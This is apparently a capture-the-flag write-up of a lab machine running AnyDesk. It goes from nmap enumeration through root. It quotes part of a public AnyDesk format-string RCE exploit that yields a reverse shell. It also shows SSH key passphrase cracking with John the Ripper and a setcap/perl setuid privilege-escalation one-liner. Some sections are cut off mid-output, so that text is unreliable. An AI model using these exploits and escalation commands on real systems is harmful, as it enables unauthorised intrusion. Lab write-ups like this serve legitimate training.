## Objectives
- What is user.txt?
- What is root.txt?

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 -p- $ip`

```bash
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
7070/tcp open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
36071/tcp open  unknown
```

<br>

# AnyDesk Digging

Seeing the ssl-cert value for port 7070 as **AnyDesk Client** led me to search around on that and find that there is usually a UDP port open for that at 50001. An nmap scan:

`sudo nmap -sU -p 50001 $ip`

```bash
PORT      STATE         SERVICE VERSION
50001/udp open|filtered unknown
```

I run a **searchsploit** to see if there are any vulnerabilities and see one with RCE:

`searchsploit anydesk`

```bash
---------------------------------------------------------------------- ---------------------------------

I pull it over and open it up to look at the code:

`searchsploit -m 49613`

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

I change the ip variable to the target system and also run msfvenom again with the command provided as a comment using my own IP to catch the reverse shell at.

I start up a listener on my system and then run the exploit.

`python3 49613.py`

```bash
sending payload ...
Traceback (most recent call last):
  File "/home/kali/work/49613.py", line 46, in <module>
    p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
TypeError: can only concatenate str (not "bytes") to str
```

Well darn. I get stuck for a little bit here and eventually try and run it with python2 which for whatever reason works. That was frustrating.

<br>

## System Access

`python2 49613.py`

```bash
sending payload ...
reverse shell should connect within 5 seconds
```

```bash
listening on [any] 4444 ...
connect to [10.6.127.197] from (UNKNOWN) [10.10.191.127] 46050

hostname

```

Alright we're on the system! Now let's get a useable shell.

```bash
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

## System Enumeration

The **user.txt** flag is waiting for us in our home directory:

`wc -c /home/annie/user.txt`

```bash
23 /home/annie/user.txt
```

`sudo -l` requires a password.

Nothing interesting capabilities wise.

Looking in annie's .ssh directory shows an already created ssh key which I copy to my own system and try and ssh back over.

`ssh -i id_rsa annie@$ip`

```bash
Enter passphrase for key 'id_rsa': 
```

I try and crack it with **John the Ripper**:

`ssh2john id_rsa > hash`

`john hash --wordlist=rockyou.txt`

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And ssh back over with `ssh -i id_rsa annie@$ip`:

```bash
Enter passphrase for key 'id_rsa':

```

I try `sudo -l` again just in case but the password we just cracked doesn't work.

I forgot to check for SUID files earlier and do that now:

`find / -perm /4000 2>/dev/null`

One sticks out as out of the ordinary:

```bash
/sbin/setcap
```

`ls -al /sbin/setcap`

```bash
-rwsr-xr-x 1 root root 10232 Nov 16  2017 /sbin/setcap
```

Alright, we can work with that! We should be able to set setuid capabilities on something and get root that way.

<br>

## Root

I check a few programs before settling on perl, and looking it up on GTFO bins shows how to exploit it once I've set the capability on it.

I set cap_setuid+ep on it and then check to make sure it took with getcap. Then execute the command from GTFOBins and end up with root!

```bash
annie@desktop:/tmp$ which perl
/usr/bin/perl
annie@desktop:/tmp$ /sbin/setcap cap_setuid+ep /usr/bin/perl
annie@desktop:/tmp$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
annie@desktop:/tmp$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
# hostname
desktop
```

And the root flag:

`wc -c /root/root.txt`

```bash
26 /root/root.txt
```

One really cool thing the author did here that I want to point out is they bought a 1 month voucher for THM and put it in a file in the root directory for the person who got first blood on the box (or whoever redeems it first). Not only do you put together a fun box for us to use but you gave away a voucher as well.

Hats off to you good sir, that's awesome of you to do.

`cat /root/THM-Voucher.txt`

```
Congratz to the blood-taker!
Prize is a 1 month THM subscription voucher:
Q9oimd
```

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap**
- Finding AnyDesk running and exploiting a vulnerability to get an initial foothold
- Finding a password protected id_rsa key that we use **ssh2john** on  and then crack it with **John the Ripper**
- Finding that **/sbin/setcap** has SUID set allowing us to set capabilities on any file, which we do to the perl executable and use it to escalate to root
